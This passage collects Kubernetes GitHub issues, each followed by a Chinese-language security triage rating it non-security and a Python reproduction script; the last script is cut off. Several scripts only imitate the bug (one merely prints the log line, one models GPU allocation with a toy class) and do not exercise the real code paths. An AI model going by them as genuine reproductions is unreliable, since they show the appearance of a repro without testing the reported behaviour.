#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述的主要是 Kubernetes Server Side Apply 在处理默认值（Late defaults）和经过变更的入站请求（mutating admission）时，两个使用相同配置的字段管理器（field managers）之间出现所有权冲突的问题。从描述内容来看，这个问题属于对资源配置管理语义的缺陷或不一致性，比如默认值应用后产生的“共享所有权”与实际冲突情况不一致，其本质上是一个逻辑或设计问题，而非直接的安全漏洞。因此，该问题不会导致命令执行、提权、容器逃逸等高安全风险问题，也不涉及日志泄露、敏感信息暴露或者拒绝服务（DoS）等安全威胁。

**复现过程：**

```python
import time
import threading
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def timeout_exit():
    # 超时2分钟后退出程序
    time.sleep(120)
    print("执行超时，退出脚本")
    exit(1)

def main():
    # 启动超时机制
    timer = threading.Thread(target=timeout_exit, daemon=True)
    timer.start()

    # 加载默认 kubeconfig
    try:
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 出错:", e)
        return

    v1 = client.CoreV1Api()
    namespace = "default"
    cm_name = "ssa-late-default-demo"

    # 清理已有 ConfigMap（如果存在）
    try:
        v1.delete_namespaced_config_map(cm_name, namespace)
        # 等待删除生效
        time.sleep(2)
    except ApiException as e:
        if e.status != 404:
            print("删除旧的 ConfigMap 失败:", e)
            return

    # mgr1 使用 Server Side Apply 应用配置：f1: "x"
    cm_apply_mgr1 = {
        "apiVersion": "v1",
        "kind": "ConfigMap",
        "metadata": {
            "name": cm_name
        },
        "data": {
            "f1": "x"
        }
    }
    try:
        # 使用 force=True 表示强制覆盖冲突
        cm1 = v1.patch_namespaced_config_map(
            name=cm_name,
            namespace=namespace,
            body=cm_apply_mgr1,
            field_manager="mgr1",
            force=True
        )
        print("mgr1 应用成功，ConfigMap data:", cm1.data)
    except ApiException as e:
        print("mgr1 应用时出错:", e)
        return

    # 模拟 mutating admission 或 defaulting 处理，将 f1 修改为 "z"
    try:
        # 读取当前 ConfigMap
        current_cm = v1.read_namespaced_config_map(cm_name, namespace)
        # 模拟入站变更：后台将 f1 修改为 "z"
        if current_cm.data is None:
            current_cm.data = {}
        current_cm.data["f1"] = "z"
        # 使用 replace 完成模拟变更
        updated_cm = v1.replace_namespaced_config_map(cm_name, namespace, current_cm)
        print("模拟变更后，ConfigMap data:", updated_cm.data)
    except ApiException as e:
        print("模拟变更时出错:", e)
        return

    # mgr2 尝试使用与 mgr1 相同的配置（f1: "x"）进行 Server Side Apply
    cm_apply_mgr2 = {
        "apiVersion": "v1",
        "kind": "ConfigMap",
        "metadata": {
            "name": cm_name
        },
        "data": {
            "f1": "x"
        }
    }
    try:
        cm2 = v1.patch_namespaced_config_map(
            name=cm_name,
            namespace=namespace,
            body=cm_apply_mgr2,
            field_manager="mgr2",
            force=False  # 不强制覆盖，使冲突更明显
        )
        print("mgr2 应用成功，ConfigMap data:", cm2.data)
    except ApiException as e:
        print("mgr2 应用时发生冲突:", e)
    
    print("脚本执行完毕。")

# 直接调用 main 函数执行
main()
```


**解释说明：**

1. 脚本首先加载默认的 kubeconfig 文件，并初始化 Kubernetes CoreV1Api 客户端。
2. 为避免已有冲突资源对测试产生影响，脚本尝试删除名称为“ssa-late-default-demo”的 ConfigMap（如果存在）。
3. 模拟场景中，首先由 mgr1 通过 Server Side Apply 应用一个包含 data 字段 { "f1": "x" } 的 ConfigMap，使用 field_manager 参数标识出配置的所有者。
4. 随后，脚本模拟入站变更/默认值处理（例如通过 mutating admission 或策略默认），将 ConfigMap 中的 f1 字段改为 "z"。这一步使用常规的 replace 操作来模拟默认值或远程变更操作。
5. 最后，mgr2 也尝试以相同的配置（f1: "x"）应用该 ConfigMap，此时由于后台已有变更（f1 值为 "z"）而导致所有权冲突。捕获并打印冲突错误。
6. 脚本设置了超时机制，确保超过2分钟后自动退出，且全部流程通过 Python 的 Kubernetes 客户端库完成，无需调用外部命令。

该复现脚本用于本地测试和研究，旨在模拟 Issue 中描述的冲突现象，并不构成对生产环境的真正攻击或破坏。整个问题是资源配置管理语义上的不一致，与安全攻击手段并无直接关联，因此风险评级判定为“不涉及”。

---


## Issue #129959 --timeout argument ignored in rollout status

- Issue 链接：[#129959](https://github.com/kubernetes/kubernetes/issues/129959)

### Issue 内容

#### What happened?

Setting a timeout argument to '20m' in `kubectl rollout status` doesn't do anything. See attached screenshot from Jenkins pipeline, showing a 10min timeout even though the timeout was set to 20 minutes. 

![Image](https://github.com/user-attachments/assets/bdf1c2ef-f147-4b77-b259-d59cb4bcf402)

Here's the command output showing it timed out:

```console
14:08:47  + kubectl -n dev rollout status deploy/stt-service '--timeout=20m'
14:08:47  Waiting for deployment "stt-service" rollout to finish: 1 old replicas are pending termination...
14:18:54  error: deployment "stt-service" exceeded its progress deadline
```

#### What did you expect to happen?

I expected the timeout of the command to change as per [the docs](https://kubernetes.io/docs/reference/kubectl/generated/kubectl_rollout/kubectl_rollout_status/). 

#### How can we reproduce it (as minimally and precisely as possible)?

Using s ervice which takes more than 10 minutes to be ready: 
kubectl rollout status ${serviceName} --timeout=20m

Then check how long the command waits before exiting. 

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.5
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.8-gke.1162000
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 issue 描述的问题与 kubectl rollout status 命令中 --timeout 参数无效有关，属于命令行为的 Bug，而非安全漏洞。问题本质上是一个功能性缺陷，不存在命令执行、容器逃逸、提权等安全影响，也不涉及敏感凭证的泄露或不当配置等安全风险。

**复现过程：**

```python
import time
from datetime import datetime, timedelta
from kubernetes import client, config, watch

def main():
    # 加载默认 kubeconfig
    try:
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 失败：", e)
        return

    # 可配置的命名空间、Deployment 名称和超时时间
    # 注：这里超时时间仅为示例，真实环境下应使用较长时长（例如20分钟），但
    # 为了确保脚本在2分钟内退出，我们将演示超时时间设置为120秒
    namespace = "dev"
    deployment_name = "stt-service"
    # 本示例超时设置为120秒（模拟20m参数，但为测试目的缩短）
    timeout_seconds = 120

    apps_v1 = client.AppsV1Api()
    start_time = datetime.now()
    deadline = start_time + timedelta(seconds=timeout_seconds)

    print("开始检测 deployment '{}' 在命名空间 '{}' 中的 rollout 状态...".format(deployment_name, namespace))
    w = watch.Watch()
    
    try:
        # 观察 deployment 的变化，注意 watch 的 timeout_seconds 参数仅保证观察时段内的流量
        for event in w.stream(apps_v1.read_namespaced_deployment_status,
                              name=deployment_name,
                              namespace=namespace,
                              timeout_seconds=timeout_seconds):
            current_time = datetime.now()
            # 检查是否超过预设总超时时间
            if current_time > deadline:
                print("总等待时间超过设定超时（{}秒），退出监控".format(timeout_seconds))
                w.stop()
                break

            deployment = event['object']
            status = deployment.status
            available_replicas = status.available_replicas if status.available_replicas is not None else 0
            desired_replicas = deployment.spec.replicas

            print("[{}] available_replicas = {} / desired_replicas = {}".format(
                datetime.now().strftime("%H:%M:%S"),
                available_replicas, desired_replicas))

            # 当 Available replicas 数量达到期望值时认为 rollout 完成
            if available_replicas >= desired_replicas:
                print("Deployment 已 rollout 完成")
                w.stop()
                break

    except Exception as e:
        print("监控过程中出现异常：", e)

    total_runtime = (datetime.now() - start_time).total_seconds()
    # 判断 rollout 是否在超时时间内完成
    if total_runtime >= timeout_seconds:
        print("error: deployment \"{}\" exceeded its progress deadline".format(deployment_name))
    else:
        print("Total runtime: {:.2f}秒".format(total_runtime))

# 直接调用 main 函数执行
main()
```


---


## Issue #129952 Kubelet 1.31.0/1.31.1 cannot start on Windows

- Issue 链接：[#129952](https://github.com/kubernetes/kubernetes/issues/129952)

### Issue 内容

#### What happened?

We have a mixed Linux/Windows cluster with eight Linux nodes and, for now, a single Windows node. The cluster is a "bare metal" cluster running on VMware hosts provisioned using `kubeadm`.

Since upgrading from 1.30 to 1.31, the kubelet cannot start on Windows anymore. Initially, we upgraded to 1.31.0 and experienced the problem; after reading #126965, we tried upgrading to 1.31.1, but the problem persists.

The `kubelet.err.log` on the Windows Server 2022 host reports:

```console
run.go:72] "command failed" err="failed to run Kubelet: protocol \"unix\" not supported"
```

This happens with version 1.31.0 as well as 1.31.1 of the Windows kubelet version.

#### What did you expect to happen?

We expected the upgrade to be as smooth as it used to be.

#### How can we reproduce it (as minimally and precisely as possible)?

I assume it would be necessary to setup a mixed cluster running 1.30.X and attempt an upgrade to 1.31.0.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.4
Kustomize Version: v5.4.2
Server Version: v1.31.1
```

</details>


#### Cloud provider

<details>
Bare metal cluster running on VMware VMs - provisioned using kubeadm.
</details>


#### OS version

<details>

```console
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

$ uname -a
Linux ddkcphdswkube02 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
BuildNumber  Caption                                 OSArchitecture  Version
20348        Microsoft Windows Server 2022 Standard  64-bit          10.0.20348
```

</details>


#### Install tools

<details>
Kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)




#### Related plugins (CNI, CSI, ...) and versions (if applicable)




### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述的是在 Kubernetes 升级到 1.31.0/1.31.1 后，Windows 平台上的 kubelet 无法启动，报错信息为 "protocol \"unix\" not supported"。经过分析，该问题主要是由于 Windows 平台不支持 Unix 域套接字导致的兼容性 bug，并非由于不当的配置、凭证泄露、命令执行、容器逃逸或提权等安全漏洞引起，从安全角度看，该 Issue 并不会导致攻击者利用漏洞获取权限或造成数据泄露。

**复现过程：**

```python
#!/usr/bin/env python3
"""
说明：此脚本用于模拟检查 Kubernetes 集群中 Windows 节点所使用的 kubelet 版本，
当检测到版本为 v1.31.0 或 v1.31.1 时，提示存在类似报错（protocol "unix" not supported）的问题。
该脚本仅用于帮助用户确认集群中是否存在受此影响的 Windows 节点，并非利用实际漏洞。
"""

import sys
import time
import threading
from kubernetes import client, config

def main():
    try:
        # 从默认位置加载 kubeconfig
        config.load_kube_config()
    except Exception as e:
        print("加载 kubeconfig 失败，请确认默认位置有正确的 kubeconfig 文件。错误信息：", e)
        sys.exit(1)

    v1 = client.CoreV1Api()

    try:
        node_list = v1.list_node().items
    except Exception as e:
        print("获取节点列表失败，错误信息：", e)
        sys.exit(1)

    affected = False
    for node in node_list:
        labels = node.metadata.labels or {}
        os_label = labels.get("kubernetes.io/os", "").lower()
        if os_label == "windows":
            kubelet_version = node.status.node_info.kubelet_version
            if kubelet_version in ["v1.31.0", "v1.31.1"]:
                print(f"警告：Windows 节点 '{node.metadata.name}' 使用 kubelet 版本 {kubelet_version}，可能会出现启动失败错误：protocol \"unix\" not supported")
                affected = True

    if not affected:
        print("未检测到受影响的 Windows 节点。")
    # 等待几秒后退出，避免立即退出
    time.sleep(3)

def run_with_timeout(func, timeout):
    thread = threading.Thread(target=func)
    thread.start()
    thread.join(timeout)
    if thread.is_alive():
        print("脚本执行超时，退出。")
        sys.exit(1)

# 执行主程序，超时时间设置为 120 秒
run_with_timeout(main, 120)
```


---


## Issue #130145 Pod Allocate failed due to requested number of devices unavailable for nvidia.com/gpu. Requested:1, Available: 0, which is unexpected

- Issue 链接：[#130145](https://github.com/kubernetes/kubernetes/issues/130145)

### Issue 内容

#### What happened?

Recently, we encountered an intermittent issue that occurs approximately once a week. The error event is as follows:

```
...
Status:              Failed
Reason:            UnexpectedAdmissionError
Message:         Pod Allocate failed due to requested number of devices unavailable for nvidia.com/gpu. Requested:1, Available: 0, which is unexpected
```
After this error occurs, pods scheduled to the node persistently report the UnexpectedAdmissionError, and restarting the kubelet resolves the issue.

**Context:**
- We use GPU scheduling with jobs that request GPU resources (multi-GPU or single-GPU),each pod includes an init container and a app container.
- In abnormal scenarios, when a pod fails to start (status: Failed), it is forcibly deleted (`kubectl delete pod --force`).

**Analysis:**
After adding debug log, we observed that the `m.allocatedDevices` (a data structure tracking device allocations) contained stale data, causing devices to remain "occupied" indefinitely.

We analyzed the code and found that `m.allocatedDevices` is reset during pod allocation. However, the reset logic is skipped under a specific condition:

When activePods  matches `m.podDevices.pods()` (the list of pods tracked by the device manager), the code does not reset `m.allocatedDevices`.

By adding debug logs, we confirmed that when the kubelet repeatedly reports UnexpectedAdmissionError, the condition `len(podsToBeRemoved) <= 0` (no pods marked for removal) prevents the update of `m.allocatedDevices`. This leaves stale data in `m.allocatedDevices`, leading to incorrect resource allocation.

https://github.com/kubernetes/kubernetes/blob/e62ce1c9db2dadf225f37fe3dc943b64dc251950/pkg/kubelet/cm/devicemanager/manager.go#L551-L570

After analyzing up to this point, I still haven't identified the root cause of why the kubelet enters this state. Any insights would be greatly appreciated. Thanks in advance!



#### What did you expect to happen?

Pods can run normally on the node without reporting the `UnexpectedAdmissionError.`



#### How can we reproduce it (as minimally and precisely as possible)?

Create a large number of jobs, each requesting single-GPU or multi-GPU resources and including an init container and an app container. Some of these jobs fail immediately after starting and are forcibly deleted.



#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
v1.29.3

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 issue 报告描述的是 kubelet 在分配 GPU 设备时，由于设备管理模块中 tracking（m.allocatedDevices）存在陈旧数据（stale data）导致资源分配异常的问题。主要表现为当某些 pod 因启动失败被强制删除后，未能及时清除设备分配记录，导致后续对 GPU 的分配判断出现错误。这属于资源调度和设备管理逻辑上的 bug，而非安全漏洞，其影响范围主要在资源耗尽和 Pod 调度失败，不存在未经授权执行任意代码、命令执行、提权、容器逃逸等安全问题。

**复现过程：**

```python
import time

# 定义一个模拟GPU设备管理的类
class DeviceManager:
    def __init__(self):
        # 模拟记录已分配设备情况，key为资源名称（这里为'nvidia.com/gpu'），value为已分配数量
        self.allocated_devices = {}
        # 模拟记录每个pod所占用的设备数，key为pod名称，value为设备数
        self.pod_devices = {}

    def allocate_devices(self, pod_name, requested):
        # 模拟实际只有1个GPU设备可用，若已分配，则available为0
        available = 1 if self.allocated_devices.get('nvidia.com/gpu', 0) == 0 else 0
        if available < requested:
            # 触发分配失败情景：由于可用设备不足，抛出异常
            raise Exception(
                "Pod Allocate failed due to requested number of devices unavailable for nvidia.com/gpu. "
                f"Requested:{requested}, Available:{available}, which is unexpected"
            )
        else:
            # 成功分配设备
            self.allocated_devices['nvidia.com/gpu'] = requested
            self.pod_devices[pod_name] = requested
            print(f"Allocated {requested} GPU for {pod_name}")

    def cleanup(self, active_pods):
        # 模拟清理已删除pod的设备分配
        pods_to_remove = [pod for pod in self.pod_devices if pod not in active_pods]
        # 当没有pod被标记为需要清理时，跳过清理动作，导致stale data的残留
        if len(pods_to_remove) <= 0:
            print("Cleanup skipped: No pods marked for removal; stale data remains in allocated_devices.")
        else:
            for pod in pods_to_remove:
                print(f"Cleaning up device allocation for {pod}")
                self.allocated_devices.pop('nvidia.com/gpu', None)
                self.pod_devices.pop(pod, None)

def main():
    dm = DeviceManager()
    
    # 初始状态：pod1正常申请GPU资源
    active_pods = ['pod1']
    try:
        dm.allocate_devices('pod1', 1)
    except Exception as err:
        print("Allocation error for pod1:", err)

    # 模拟pod1出现错误后被强制删除，但由于active_pods未更新，cleanup操作跳过，
    # 导致m.allocatedDevices中仍保留pod1的分配记录（stale data）
    print("\nSimulating forced deletion scenario where pod1 is failed but not removed from active_pods:")
    dm.cleanup(active_pods)
    
    # 尝试为新pod（pod2）申请GPU，由于staled记录存在，分配将失败，触发异常
    try:
        print("\nAttempting to allocate GPU for pod2:")
        dm.allocate_devices('pod2', 1)
    except Exception as err:
        print("Allocation error for pod2:", err)

    # 等待后退出，确保脚本执行时间在规定范围内
    time.sleep(1)
    print("\nScript completed.")

# 直接执行main函数
main()
```


**解释说明：**

复现脚本中构造了一个简单的 DeviceManager 类，用于模拟 kubelet 中设备分配的核心逻辑。脚本流程如下：
1. pod1 成功分配到 GPU 资源，记录在 allocated_devices 与 pod_devices 中。
2. 模拟 pod1 异常后被强制删除，但由于 active_pods 列表未更新（依然包含 pod1），调用 cleanup() 时不会清理对应的资源记录，从而留下了 stale data。
3. 当尝试为新创建的 pod2 分配 GPU 时，由于系统错误地认为 GPU 已被占用，导致分配失败并抛出异常。

从安全风险角度来看，此问题属于资源管理逻辑错误，并没有引入可供攻击者利用的漏洞，不存在命令执行、提权或容器逃逸等高风险安全问题，因此风险评级判断为“不涉及”。该复现脚本仅用于模拟问题出现的场景，以供开发者调试和定位问题，符合研究和本地测试的要求。

---


## Issue #130142 Windows - eviction manager:  no observation found for eviction signal `containerfs.inodesFree`

- Issue 链接：[#130142](https://github.com/kubernetes/kubernetes/issues/130142)

### Issue 内容

#### What happened?

 I noticed the v1.32.1 Kubelet on Windows, logs very frequently the following entries for `containerfs.inodesFree` signal which is not supported on Windows, it also contribute to a larger log file. 

```
I0213 04:51:38.888080    1532 helpers.go:940] "Eviction manager: no observation found for eviction signal" signal="containerfs.inodesFree"
I0213 04:51:38.888080    1532 helpers.go:940] "Eviction manager: no observation found for eviction signal" signal="containerfs.inodesFree"
```

Similar issue was reported before for nodefs.inodesFree signal: 
- https://github.com/kubernetes/kubernetes/issues/73792
- https://github.com/kubernetes/kubernetes/issues/66088

 and addressed by @feiskyer on 
- https://github.com/kubernetes/kubernetes/pull/67709



The `containerfs.inodesFree` issue was also reported in https://github.com/kubernetes/kubernetes/issues/73792#issuecomment-2513956582



#### What did you expect to happen?

containerfs.inodesFree is not supported for Windows (Linux only) [1]. The missing observation log should not appear on Windows.



[1] https://kubernetes.io/docs/concepts/scheduling-eviction/node-pressure-eviction/#eviction-signals

#### How can we reproduce it (as minimally and precisely as possible)?

Deployed a cluster with v1.32.1 kubelet, configure Windows nodes and run Windows workloads. Check the kubelet logs in the Windows node; the `Eviction manager: no observation found for eviction signal` event appears  very frequently for the `containerfs.inodesFree`  signal.

#### Anything else we need to know?


Effective kubeletconfig
```
{
  "kubeletconfig": {
    "enableServer": true,
    "podLogsDir": "/var/log/pods",
    "syncFrequency": "1m0s",
    "fileCheckFrequency": "20s",
    "httpCheckFrequency": "20s",
    "address": "0.0.0.0",
    "port": 10250,
    "rotateCertificates": true,
    "serverTLSBootstrap": true,
    "authentication": {
      "x509": {
        "clientCAFile": "C:\\k\\kubelet-ca.crt"
      },
      "webhook": {
        "enabled": true,
        "cacheTTL": "2m0s"
      },
      "anonymous": {
        "enabled": false
      }
    },
    "authorization": {
      "mode": "Webhook",
      "webhook": {
        "cacheAuthorizedTTL": "5m0s",
        "cacheUnauthorizedTTL": "30s"
      }
    },
    "registryPullQPS": 5,
    "registryBurst": 10,
    "eventRecordQPS": 50,
    "eventBurst": 100,
    "enableDebuggingHandlers": true,
    "healthzPort": 10248,
    "healthzBindAddress": "127.0.0.1",
    "oomScoreAdj": -999,
    "clusterDomain": "cluster.local",
    "clusterDNS": [
      "172.30.0.10"
    ],
    "streamingConnectionIdleTimeout": "4h0m0s",
    "nodeStatusUpdateFrequency": "10s",
    "nodeStatusReportFrequency": "5m0s",
    "nodeLeaseDurationSeconds": 40,
    "imageMinimumGCAge": "2m0s",
    "imageMaximumGCAge": "0s",
    "imageGCHighThresholdPercent": 85,
    "imageGCLowThresholdPercent": 80,
    "volumeStatsAggPeriod": "1m0s",
    "cgroupsPerQOS": false,
    "cgroupDriver": "cgroupfs",
    "cpuManagerPolicy": "none",
    "cpuManagerReconcilePeriod": "10s",
    "memoryManagerPolicy": "None",
    "topologyManagerPolicy": "none",
    "topologyManagerScope": "container",
    "runtimeRequestTimeout": "10m0s",
    "hairpinMode": "promiscuous-bridge",
    "maxPods": 250,
    "podPidsLimit": -1,
    "resolvConf": "",
    "cpuCFSQuota": true,
    "cpuCFSQuotaPeriod": "100ms",
    "nodeStatusMaxImages": 50,
    "maxOpenFiles": 1000000,
    "contentType": "application/vnd.kubernetes.protobuf",
    "kubeAPIQPS": 50,
    "kubeAPIBurst": 100,
    "serializeImagePulls": false,
    "evictionHard": {
      "imagefs.available": "15%",
      "memory.available": "500Mi",
      "nodefs.available": "10%"
    },
    "evictionPressureTransitionPeriod": "5m0s",
    "enableControllerAttachDetach": true,
    "makeIPTablesUtilChains": true,
    "iptablesMasqueradeBit": 14,
    "iptablesDropBit": 15,
    "featureGates": {
      "RotateKubeletServerCertificate": true
    },
    "failSwapOn": true,
    "memorySwap": {},
    "containerLogMaxSize": "50Mi",
    "containerLogMaxFiles": 5,
    "containerLogMaxWorkers": 1,
    "containerLogMonitorInterval": "10s",
    "configMapAndSecretChangeDetectionStrategy": "Watch",
    "systemReserved": {
      "cpu": "500m",
      "ephemeral-storage": "1Gi",
      "memory": "1Gi"
    },
    "volumePluginDir": "/usr/libexec/kubernetes/kubelet-plugins/volume/exec/",
    "logging": {
      "format": "text",
      "flushFrequency": "5s",
      "verbosity": 4,
      "options": {
        "text": {
          "infoBufferSize": "0"
        },
        "json": {
          "infoBufferSize": "0"
        }
      }
    },
    "enableSystemLogHandler": true,
    "enableSystemLogQuery": true,
    "shutdownGracePeriod": "0s",
    "shutdownGracePeriodCriticalPods": "0s",
    "crashLoopBackOff": {},
    "enableProfilingHandler": true,
    "enableDebugFlagsHandler": true,
    "seccompDefault": false,
    "memoryThrottlingFactor": 0.9,
    "registerWithTaints": [
      {
        "key": "os",
        "value": "Windows",
        "effect": "NoSchedule"
      }
    ],
    "registerNode": true,
    "localStorageCapacityIsolation": true,
    "containerRuntimeEndpoint": "npipe://./pipe/containerd-containerd",
    "failCgroupV1": false
  }
}

```

#### Kubernetes version

v1.32.1

#### Cloud provider

Any, not relevant


#### OS version


On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture

```
BuildNumber  Caption                                                                 OSArchitecture  Version     
20348                Microsoft Windows Server 2022 Standard    64-bit                     10.0.20348 
```


#### Container runtime (CRI) and version (if applicable)

```
containerd
version=v1.7.25
revision=bcc810d6b9066471b0b6fa75f557a15a1cbf31bb
```


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述的是在 Windows 环境下运行 v1.32.1 版本的 kubelet 时，会频繁输出 "Eviction manager: no observation found for eviction signal" 的日志，原因是该平台不支持 containerfs.inodesFree 信号。问题本质上属于日志冗余或配置不匹配的问题，并无命令执行、权限提升、DoS 攻击、容器逃逸等安全风险，因此不涉及安全漏洞。

**复现过程：**

```python
#!/usr/bin/env python
"""
该脚本仅用于演示日志错误的情况，由于问题不涉及安全风险，
故此复现脚本不包含任何安全漏洞攻击代码，仅用于模拟检查日志中是否存在错误信息。
"""

import time
import threading

# 模拟 kubelet 日志打印函数
def simulate_kubelet_logs():
    # 模拟日志内容中包含错误提示信息
    error_message = "Eviction manager: no observation found for eviction signal signal=\"containerfs.inodesFree\""
    # 模拟每20秒打印一次，整个演示持续1分钟后退出
    for _ in range(3):
        print(time.strftime("%Y-%m-%d %H:%M:%S"), error_message)
        time.sleep(20)

def main():
    # 启动日志模拟线程
    log_thread = threading.Thread(target=simulate_kubelet_logs)
    log_thread.start()
    # 设定超时时间为70秒，确保脚本执行结束
    log_thread.join(timeout=70)
    print("日志模拟结束，问题仅为日志多余记录，不存在实际安全风险。")

# 直接调用 main 函数执行
main()
```


**解释说明：**

1. 本脚本模拟了 kubelet 在 Windows 平台下由于不支持 containerfs.inodesFree 信号而打印错误日志的情况。  
2. 脚本中通过 simulate_kubelet_logs 函数每隔20 秒打印一次错误日志，共打印三次，总时长约为1分钟。  
3. 由于该问题不涉及任何安全漏洞或高风险操作，因此仅用于日志错误输出模拟，不含有任何破坏性或利用代码。  
4. 脚本使用 threading 和 join 的方式确保在70秒内自动退出，符合执行超时机制要求。

---


## Issue #130139 APIServer APF estimates cost for LIST not work

- Issue 链接：[#130139](https://github.com/kubernetes/kubernetes/issues/130139)

### Issue 内容

#### What happened?

According to the documentation https://kubernetes.io/docs/concepts/cluster-administration/flow-control/#seats-occupied-by-a-request , the APIServer's APF (API Priority and Fairness) calculates seats for each request as a reference to measure the consumption of each API. Specifically, List requests determine the number of seats based on the number of objects returned.

However, in actual usage, I have observed that all List requests (regardless of the number of objects) are assigned only 1 seat by APF.
For example, I have 1w+ pods in cluster,  seat expected to be 10.
```
apiserver_flowcontrol_work_estimated_seats_bucket{flow_schema="list-pods",priority_level="list-pods",le="1"} 84
apiserver_flowcontrol_work_estimated_seats_bucket{flow_schema="list-pods",priority_level="list-pods",le="2"} 84
apiserver_flowcontrol_work_estimated_seats_bucket{flow_schema="list-pods",priority_level="list-pods",le="4"} 84
apiserver_flowcontrol_work_estimated_seats_bucket{flow_schema="list-pods",priority_level="list-pods",le="10"} 84
apiserver_flowcontrol_work_estimated_seats_bucket{flow_schema="list-pods",priority_level="list-pods",le="+Inf"} 84
```

I found that the seat calculation for List requests happens at 

https://github.com/kubernetes/kubernetes/blob/2642d8222d8524133ce21fe195edd1a1912090db/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/request/list_work_estimator.go#L50

and every request hit the error:
https://github.com/kubernetes/kubernetes/blob/2642d8222d8524133ce21fe195edd1a1912090db/staging/src/k8s.io/apiserver/pkg/util/flowcontrol/request/list_work_estimator.go#L100
.

So I add some debug log in `objectCountTracker ` set, found that `objectCountTracker` is nil, so it will never update the object count, which will cause `ObjectCountNotFoundErr` in APF list estimator.

https://github.com/kubernetes/kubernetes/blob/2642d8222d8524133ce21fe195edd1a1912090db/staging/src/k8s.io/apiserver/pkg/registry/generic/registry/store.go#L1673-L1675


#### What did you expect to happen?

In APF (API Priority and Fairness), the seats for a List request should increase with the number of objects returned, rather than always being 1.

#### How can we reproduce it (as minimally and precisely as possible)?

There is my apf config.

```
apiVersion: flowcontrol.apiserver.k8s.io/v1beta3
kind: PriorityLevelConfiguration
metadata:
  name: list-pods
spec:
  limited:
    nominalConcurrencyShares: 1
    borrowingLimitPercent: 0
    limitResponse:
      queuing:
        handSize: 5
        queueLengthLimit: 0
        queues: 5
      type: Queue
  type: Limited
---
apiVersion: flowcontrol.apiserver.k8s.io/v1beta3
kind: FlowSchema
metadata:
  name: list-pods
spec:
  distinguisherMethod:
    type: ByUser
  matchingPrecedence: 100
  priorityLevelConfiguration:
    name: list-pods
  rules:
  - resourceRules:
    - apiGroups:
      - '*'
      clusterScope: true
      namespaces:
      resources:
      - pods
      verbs:
      - list
    subjects:
    - group:
        name: system:authenticated
      kind: Group

```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
Server Version: v1.32.2
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 issue 描述了 Kubernetes API Server 的 APF（API Priority and Fairness）在处理 List 请求时的座位（seat）估算问题，实际情况是无论返回的对象数量如何，APF 始终只分配 1 个 seat。经过调试发现，原因是 APIServer 在计算 List 请求座位时所依赖的 objectCountTracker 出现了 nil 的情况，导致无法正确获取对象数，从而触发 ObjectCountNotFoundErr，最终导致座位计算忽略了实际的对象数。总体来看，这属于功能性 bug，主要影响资源调度和流控行为，不直接涉及未授权访问、命令执行、提权、容器逃逸等安全问题，也没有形成明显的拒绝服务（DoS）攻击向量。因此，此 issue 不属于安全问题，其风险点主要在于错误的流控配置可能导致异常的请求调度，但该问题本身并不会产生严重安全影响。

**复现过程：**

```python
#!/usr/bin/env python3
"""
该脚本使用 python 的 kubernetes 客户端模拟 List 请求，演示当集群中对象数量较多时，
期望的 APF 座位值（根据对象数量）与实际由于 bug 导致固定返回 1 的现象。
该脚本仅用于研究和本地测试，务必在测试环境中运行。
"""

import math
import threading
import signal
import sys
import time
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# 设置超时（总执行时间不超过 2 分钟）
EXECUTION_TIMEOUT = 120

def timeout_handler(signum, frame):
    print("脚本执行超时，退出。")
    sys.exit(1)

def run_timeout():
